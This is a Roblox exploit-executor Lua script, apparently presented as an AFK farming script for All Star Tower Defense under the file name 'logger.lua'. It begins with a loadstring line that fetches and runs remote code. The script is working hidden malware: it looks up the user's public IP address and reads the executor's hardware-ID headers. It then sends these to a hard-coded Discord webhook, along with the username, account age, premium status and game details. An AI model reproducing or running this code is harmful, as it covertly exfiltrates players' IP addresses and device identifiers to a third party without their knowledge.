--[[
loadstring(game:HttpGet("https://raw.githubusercontent.com/XxBoomer/script/main/AllStarTD/Combo%20afk/logger.lua", true))()
--]]
repeat wait() until game:IsLoaded()
local IP = game:HttpGet("https://v4.ident.me")
plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
	premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
	premium = false
end
if premium == false then 
	if plr.AccountAge <= 70 then 
		ALT = true
	end
end
 
local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
 
 
local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end
 
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";
 
for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end
 
if hwid then
local HttpServ = game:GetService('HttpService')
local url = "https://discord.com/api/webhooks/796646377412624454/_P4ILwGlDshgZ6NvvIXr15XfKzKa5gJU3bKfaUSO7KUV6Azi43f05qOkXz_FuAnuQgkx"
 
 
local data = 
    {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "__**HWID:**__",
            ["description"] = hwid,
            ["type"] = "rich",
            ["color"] = tonumber(0xAB0909),
            ["fields"] = {
                {
                    ["name"] = "Username:",
                    ["value"] = Game.Players.LocalPlayer.Name,
                    ["inline"] = true
                },
				{
                    ["name"] = "IP Address:",
                    ["value"] = IP,
                    ["inline"] = true
                },
				{
                    ["name"] = "Game Link:",
                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                    ["inline"] = true
                },
				{
					["name"] = "Game Name:",
					["value"] = info.Name,
					["inline"] = true
				},
				{
					["name"] = "Age:",
					["value"] = plr.AccountAge,
					["inline"] = true
				},
				{
					["name"] = "Premium:",
					["value"] = premium,
					["inline"] = true
				},
				{
					["name"] = "ALT:",
					["value"] = ALT,
					["inline"] = true
				},
 
            },
        }}
    }
    local newdata = HttpServ:JSONEncode(data)
 
    local headers = {
            ["content-type"] = "application/json"
    }
 
    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
    http_request(request_payload)
end
